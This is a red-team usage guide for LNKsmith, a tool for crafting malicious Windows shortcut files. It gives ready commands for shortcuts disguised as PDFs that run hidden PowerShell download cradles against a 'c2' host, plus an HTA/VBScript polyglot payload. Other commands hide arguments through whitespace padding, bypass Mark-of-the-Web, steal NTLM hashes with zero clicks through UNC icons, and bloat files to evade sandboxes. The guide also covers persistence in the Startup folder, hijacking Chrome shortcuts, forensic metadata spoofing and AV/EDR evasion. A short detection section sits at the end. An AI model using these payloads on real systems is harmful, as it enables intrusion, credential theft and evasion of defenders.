# Red Team Usage Guide

LNKsmith gives you full control over every field in the [MS-SHLLINK]
specification. This guide covers offensive tradecraft patterns for initial
access, persistence, credential harvesting, and evasion using `.lnk` files.

[MS-SHLLINK]: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/

> **Scope**: All techniques assume authorized red team engagements,
> penetration tests, or CTF/research contexts.

---

## Table of Contents

- [Argument Padding (ZDI-CAN-25373)](#argument-padding-zdi-can-25373)
- [LOLBin Proxy Execution](#lolbin-proxy-execution)
- [Icon Masquerading](#icon-masquerading)
- [LNK/HTA Polyglot](#lnkhta-polyglot)
- [Binary Padding / File Bloating](#binary-padding--file-bloating)
- [MotW Bypass / LNK Stomping](#motw-bypass--lnk-stomping)
- [NTLM Hash Theft](#ntlm-hash-theft)
- [Environment Variable Indirection](#environment-variable-indirection)
- [Target Path Spoofing](#target-path-spoofing)
- [Startup Folder Persistence](#startup-folder-persistence)
- [Existing Shortcut Hijacking](#existing-shortcut-hijacking)
- [Tracker Data Spoofing (Anti-Forensics)](#tracker-data-spoofing-anti-forensics)
- [Combining Techniques](#combining-techniques)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Detection & OPSEC Notes](#detection--opsec-notes)

---

## Argument Padding (ZDI-CAN-25373)

**CVE-2025-9491** -- The Windows Properties dialog only displays the first
~260 characters of a shortcut's arguments field. By prepending whitespace,
real arguments are pushed past the visible boundary.

```bash
lnksmith build "C:\Windows\System32\cmd.exe" -o invoice.pdf.lnk \
    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
    --pad-args 300 \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

The Properties dialog will show ~300 spaces. The real command is hidden beyond
the scroll boundary.

`--pad-args` uses space (`0x20`) by default. Use `--pad-char` to change the
fill character. The Windows Properties dialog also hides content after
horizontal tab (`0x09`), line feed (`0x0A`), vertical tab (`0x0B`), form feed
(`0x0C`), and carriage return (`0x0D`).

### LF/CR padding (CVE-2025-9491)

LF+CR padding is harder to detect than spaces because the characters don't
render visibly in the Properties dialog:

```bash
lnksmith build "C:\Windows\System32\cmd.exe" -o invoice.pdf.lnk \
    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
    --pad-args 256 --pad-char '\n\r' \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

---

## LOLBin Proxy Execution

Point the `.lnk` target at a legitimate Windows binary (Living-off-the-Land
Binary) and pass malicious instructions through the arguments field. This
avoids dropping a custom executable to disk.

### PowerShell download cradle

```bash
lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    -o update.pdf.lnk \
    --arguments "-ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://c2/ps')" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

### mshta.exe (HTA execution)

```bash
lnksmith build "C:\Windows\System32\mshta.exe" \
    -o readme.pdf.lnk \
    --arguments "http://c2/payload.hta" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

### rundll32.exe (DLL proxy)

```bash
lnksmith build "C:\Windows\System32\rundll32.exe" \
    -o report.pdf.lnk \
    --arguments "shell32.dll,ShellExec_RunDLL C:\\Windows\\System32\\cmd.exe /c whoami" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19
```

### forfiles.exe (command execution without cmd.exe ancestry)

```bash
lnksmith build "C:\Windows\System32\forfiles.exe" \
    -o scan.pdf.lnk \
    --arguments "/p C:\Windows /m notepad.exe /c calc.exe" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19
```

### Common icon indices (imageres.dll)

| Index | Appearance           | Use case           |
| ----- | -------------------- | ------------------ |
| 19    | PDF / document       | Phishing lure      |
| 2     | Folder (closed)      | USB worm, folder   |
| 3     | Folder (open)        | USB worm, folder   |
| 15    | Generic file         | Generic document   |
| 67    | Text file            | Log/config lure    |
| 97    | Image file           | Photo lure         |
| 176   | Compressed archive   | ZIP/RAR lure       |

---

## Icon Masquerading

Windows **never** shows the `.lnk` extension, even with "Show file extensions"
enabled. A file named `report.pdf.lnk` appears as `report.pdf`. Combined with
a matching icon, it is visually indistinguishable from a real file.

### Masquerade as a PDF

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o "Q3 Financial Report.pdf.lnk" \
    --arguments "/c start /min powershell -ep bypass -f \\\\c2\\share\\payload.ps1" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

### Masquerade as a folder (USB worm style)

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o "Photos.lnk" \
    --arguments "/c start /min powershell -ep bypass -c IEX(...)" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 2 \
    --show minimized
```

### Icon from environment variable path

Use `--icon-env` for paths that resolve at runtime:

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o "setup.exe.lnk" \
    --icon-env "%SystemRoot%\System32\imageres.dll" --icon-index 11
```

---

## LNK/HTA Polyglot

Append HTA content after the `.lnk` terminal block. The `.lnk` points to
`mshta.exe` with itself as the argument. Windows processes the shortcut;
`mshta.exe` skips the binary header and executes the embedded HTA/VBScript.

### Step 1: Create the HTA payload

```html
<!-- payload.hta -->
<html><head>
<script language="VBScript">
Set s = CreateObject("WScript.Shell")
s.Run "powershell -ep bypass -w hidden -c IEX(iwr http://c2/stager)", 0
Close
</script>
</head></html>
```

### Step 2: Build the polyglot

```bash
lnksmith build "C:\Windows\System32\mshta.exe" \
    -o "meeting-notes.pdf.lnk" \
    --arguments "meeting-notes.pdf.lnk" \
    --append payload.hta \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized
```

The file appears as `meeting-notes.pdf`, opens `mshta.exe` which re-reads the
`.lnk` file and parses the trailing HTA content.

---

## Binary Padding / File Bloating

Inflate file size past AV/sandbox scanning limits. Most public sandboxes cap
at 100MB; VirusTotal caps at 650MB. Appends null bytes after the terminal
block.

```bash
# 100MB padding (bypasses most sandboxes)
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o bloated.lnk \
    --arguments "/c powershell ..." \
    --pad-size 100MB

# 700MB (bypasses VirusTotal)
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o vt-bypass.lnk \
    --pad-size 700MB
```

Supported suffixes: `KB` (1024), `MB` (1024^2), `GB` (1024^3), or plain
byte count.

### Combined with polyglot

```bash
lnksmith build "C:\Windows\System32\mshta.exe" \
    -o fat-poly.lnk \
    --arguments "fat-poly.lnk" \
    --pad-size 100MB \
    --append payload.hta
```

Padding is inserted before the appended payload data.

---

## MotW Bypass / LNK Stomping

**CVE-2024-38217** -- Craft malformed IDList entries that force Explorer to
canonicalize the `.lnk` on first access. The rewrite strips the
Mark-of-the-Web (MotW) alternate data stream, bypassing SmartScreen warnings.

> **Note**: Patched September 2024. Still effective against unpatched targets
> and useful for testing detection coverage.

### Dot variant

Appends a period to the target filename (`powershell.exe.`). Explorer strips
the dot on canonicalization, dropping MotW.

```bash
lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    -o payload.pdf.lnk \
    --arguments "-ep bypass -f .\stager.ps1" \
    --stomp-motw dot \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19
```

### Relative variant

Uses only the bare filename in the IDList (no drive/directory segments).
Explorer resolves the full path and rewrites the file, dropping MotW.

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o payload.lnk \
    --arguments "/c whoami" \
    --stomp-motw relative
```

---

## NTLM Hash Theft

Set the icon location or target to a UNC path pointing at an attacker-controlled
SMB server. When Explorer renders the folder containing the `.lnk`, it
automatically attempts to load the icon, triggering NTLM authentication.
**Zero-click** -- viewing the folder is sufficient.

### Icon-based (zero-click folder view)

```bash
lnksmith build "C:\Windows\notepad.exe" \
    -o "@meeting-notes.lnk" \
    --icon "\\\\10.0.0.5\\share\\icon.ico" \
    --description "Meeting Notes"
```

The `@` prefix sorts the file to the top of directory listings. When the
victim browses to the folder, Explorer fetches the icon from the attacker's
SMB server, leaking NTLM credentials. Use Responder or ntlmrelayx to capture.

### Target-based (on click)

```bash
lnksmith build "\\\\10.0.0.5\\share\\legit.exe" \
    -o "\\\\fileserver\\dept-share\\IT Procedures.lnk" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 2 \
    --description "IT Department Procedures"
```

### With mapped drive letter

```bash
echo '{"network_device_name": "Z:"}' > net.json
lnksmith build "\\\\attacker\\share\\payload.exe" \
    -o capture.lnk \
    -j net.json
```

---

## Environment Variable Indirection

Use environment variables in target and icon paths. Windows resolves them at
launch time, making paths portable across systems.

### Target via %COMSPEC%

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    --env-target "%COMSPEC%" \
    --arguments "/c whoami > %TEMP%\\out.txt" \
    -o env.lnk
```

### Target via %SystemRoot%

```bash
lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --env-target "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --arguments "-ep bypass -c Get-Process" \
    -o ps.lnk
```

---

## Target Path Spoofing

The `.lnk` format stores the target path in multiple redundant structures:
`LinkTargetIDList`, `LinkInfo`, and `EnvironmentVariableDataBlock`. Windows
prioritizes them differently for display vs execution, enabling several
spoofing techniques documented by
[Wietze Beukema](https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut).

### Variant 0: Invalid path characters (display mismatch)

Set `env_target_path` to a path containing invalid Windows characters
(double quotes, RTL override). Explorer shows the env block value in the
Properties dialog but falls back to `LinkTargetIDList` for execution.

```bash
echo '{"env_target_path": "\"C:\\Windows\\notepad.exe\""}' > spoof.json
lnksmith build "C:\Windows\System32\cmd.exe" \
    --arguments "/c whoami" \
    --show minimized \
    -j spoof.json \
    -o spoofed.lnk
```

### Variant 1: Null env block (disable target field)

An all-zeros `EnvironmentVariableDataBlock` disables the target field in the
Properties dialog (making it read-only) and hides command-line arguments,
while the `LinkTargetIDList` target still executes normally.

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    --null-env-block \
    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/s)" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized \
    -o invoice.pdf.lnk
```

### Variant 4: ANSI/Unicode mismatch (most effective)

The `EnvironmentVariableDataBlock` has separate ANSI and Unicode fields.
When only the ANSI field is populated and `IsUnicode` is unset, Explorer
displays the `LinkTargetIDList` path (the decoy) but executes via the ANSI
env block path (the real target). This variant works immediately without
requiring a repair cycle.

The `target` argument becomes the **decoy** (what the user sees in the
IDList). The `--env-target-ansi` value is the **real** executable.

```bash
lnksmith build "C:\Windows\notepad.exe" \
    --env-target-ansi "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --force-ansi \
    --arguments "-ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --show minimized \
    -o "Your-invoice.pdf.lnk"
```

The `--force-ansi` flag is required: it suppresses the `IsUnicode` flag and
encodes `StringData` as cp1252, matching the behavior expected by Explorer
for ANSI-only env block resolution.

---

## Startup Folder Persistence

Write a `.lnk` to the user's Startup folder for persistence across reboots.
The shortcut executes on login.

```bash
lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --arguments "-ep bypass -w hidden -f C:\ProgramData\sync.ps1" \
    --icon "C:\Program Files\Microsoft OneDrive\OneDrive.exe" \
    --description "Microsoft OneDrive Sync" \
    --show minimized \
    -o "C:\Users\targetuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
```

### With hotkey binding

Assign a hotkey so the payload also runs when the user presses the key combo:

```bash
lnksmith build "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" \
    --arguments "-ep bypass -w hidden -f C:\ProgramData\sync.ps1" \
    --icon "C:\Program Files\Microsoft OneDrive\OneDrive.exe" \
    --hotkey CTRL+SHIFT+O \
    --show minimized \
    -o OneDriveSync.lnk
```

---

## Existing Shortcut Hijacking

Modify existing desktop/taskbar shortcuts to chain-load malware before the
legitimate application. The user sees normal behavior and does not suspect
interception.

First, parse the existing shortcut to extract its fields:

```bash
lnksmith parse "C:\Users\target\Desktop\Google Chrome.lnk" --json
```

Then rebuild it with a payload chain that executes malware first, then launches
the original application. Use the parsed JSON output to preserve the original
icon, working directory, and description:

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    --arguments "/c start /min powershell -ep bypass -w hidden -f C:\ProgramData\update.ps1 & \"C:\Program Files\Google\Chrome\Application\chrome.exe\"" \
    --icon "C:\Program Files\Google\Chrome\Application\chrome.exe" \
    --working-dir "C:\Program Files\Google\Chrome\Application" \
    --description "Google Chrome" \
    --show minimized \
    -o "C:\Users\target\Desktop\Google Chrome.lnk"
```

---

## Tracker Data Spoofing (Anti-Forensics)

When Windows creates a `.lnk` via the Shell API, the `TrackerDataBlock`
records the creator's NetBIOS hostname, MAC address (in Droid GUIDs), and
volume serial number. These fields are used for attribution by forensic
analysts. lnksmith builds shortcuts from scratch (bypassing the Shell API),
so no real metadata leaks. You can also set decoy values to misdirect
attribution.

### Spoof tracker metadata

```bash
echo '{
  "tracker_machine_id": "CORPWS-PC042",
  "tracker_droid_volume_id": "{12345678-ABCD-EF01-2345-6789ABCDEF01}",
  "tracker_droid_file_id": "{AABBCCDD-1122-3344-5566-778899AABBCC}",
  "tracker_birth_droid_volume_id": "{12345678-ABCD-EF01-2345-6789ABCDEF01}",
  "tracker_birth_droid_file_id": "{AABBCCDD-1122-3344-5566-778899AABBCC}"
}' > tracker.json

lnksmith build "C:\Windows\notepad.exe" \
    -o spoofed.lnk \
    -j tracker.json
```

### Disable link tracking

Use `link_flags` via JSON to disable distributed link tracking:

```bash
echo '{"link_flags": 262144}' > notrack.json
lnksmith build "C:\Windows\notepad.exe" \
    -o notrack.lnk \
    -j notrack.json
```

### Tracking suppression flags

| Flag                       | Value        | Effect                              |
| -------------------------- | ------------ | ----------------------------------- |
| ForceNoLinkTrack           | `0x00040000` | Disable distributed link tracking   |
| DisableLinkPathTracking    | `0x00100000` | Disable path-based tracking         |
| DisableKnownFolderTracking | `0x00200000` | Prevent known-folder alias tracking |
| DisableKnownFolderAlias    | `0x00400000` | Prevent known-folder ID aliasing    |
| NoPidlAlias                | `0x00008000` | Prevent PIDL aliasing               |

Combine flags with bitwise OR. For example, `0x00040000 | 0x00200000 |
0x00400000` = `0x00640000` (6553600 decimal):

```bash
echo '{"link_flags": 6553600}' > clean.json
lnksmith build "C:\Windows\notepad.exe" \
    -o clean.lnk \
    -j clean.json
```

---

## Combining Techniques

Real-world payloads stack multiple techniques. Here is a full example
combining argument padding, icon masquerading, MotW bypass, binary padding,
tracker spoofing, and window hiding:

### JSON config (full.json)

```json
{
    "tracker_machine_id": "FINANCE-PC019",
    "tracker_droid_volume_id": "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}",
    "tracker_droid_file_id": "{11223344-5566-7788-99AA-BBCCDDEEFF00}",
    "tracker_birth_droid_volume_id": "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}",
    "tracker_birth_droid_file_id": "{11223344-5566-7788-99AA-BBCCDDEEFF00}",
    "volume_label": "OS",
    "drive_serial": 1234567890
}
```

### Build command

```bash
lnksmith build "C:\Windows\System32\cmd.exe" \
    -o "Q3 Earnings Report.pdf.lnk" \
    --arguments "/c powershell -ep bypass -w hidden -c IEX(iwr http://c2/stager)" \
    --pad-args 400 \
    --pad-size 100MB \
    --stomp-motw dot \
    --icon "C:\Windows\System32\imageres.dll" --icon-index 19 \
    --description "Q3 2025 Earnings Report" \
    --show minimized \
    -j full.json
```

This produces a file that:
1. Appears as `Q3 Earnings Report.pdf` with a PDF icon
2. Shows ~400 spaces in the Properties arguments field
3. Bypasses SmartScreen via MotW stripping
4. Exceeds most sandbox upload limits at ~100MB
5. Has spoofed forensic metadata pointing to "FINANCE-PC019"
6. Runs the PowerShell stager in a hidden, minimized window

---

## MITRE ATT&CK Mapping

| Technique         | ID          | lnksmith Feature                   |
| ----------------- | ----------- | ---------------------------------- |
| User Execution    | T1204.002   | Core `.lnk` delivery               |
| LNK Icon Smuggle  | T1027.012   | `--icon`, `--icon-env`, NTLM theft |
| Binary Padding    | T1027.001   | `--pad-size`                       |
| Shortcut Mod      | T1547.009   | Startup folder, hijacking          |
| Mshta Proxy       | T1218.005   | `--append` polyglot                |
| Rundll32 Proxy    | T1218.011   | LOLBin target                      |
| PowerShell        | T1059.001   | `--arguments` download cradle      |
| Forced Auth       | T1187        | UNC icon/target paths              |
| MotW Bypass       | T1553.005   | `--stomp-motw`                     |
| Env Var Resolve   | T1027.010   | `--env-target`, `--icon-env`       |
| Hide Artifacts    | T1564.001   | `--show minimized`, attrs 0x06     |

---

## Detection & OPSEC Notes

### What defenders look for

- **Sigma rule** `proc_creation_win_susp_lnk_exec_hidden_cmd`: detects
  `.lnk` files launching LOLBins with suspicious arguments.
- **COMMAND_LINE_ARGUMENTS** field with excessive whitespace (ZDI-CAN-25373).
- `.lnk` files with icon paths pointing to UNC/external IPs.
- `.lnk` files larger than 10KB (legitimate shortcuts are usually <4KB).
- `mshta.exe` invoked with a `.lnk` file argument (polyglot indicator).
- `.lnk` files in user-writable locations with document/folder icons.
- `TrackerDataBlock` metadata mismatches (hostname vs environment).
- Process creation: `explorer.exe` -> LOLBin with download commands.

### OPSEC considerations

- lnksmith builds from scratch (no Shell API), so no accidental metadata
  leakage from the operator's machine.
- Always spoof or omit `TrackerDataBlock` fields in production payloads.
- Use `link_flags=0x00040000` to disable distributed link tracking.
- Match timestamps to plausible values for the target environment.
- Test payloads against the target's AV/EDR stack before deployment.
- Use `lnksmith parse --json` to audit your `.lnk` before delivery -- verify
  no operational metadata leaks.
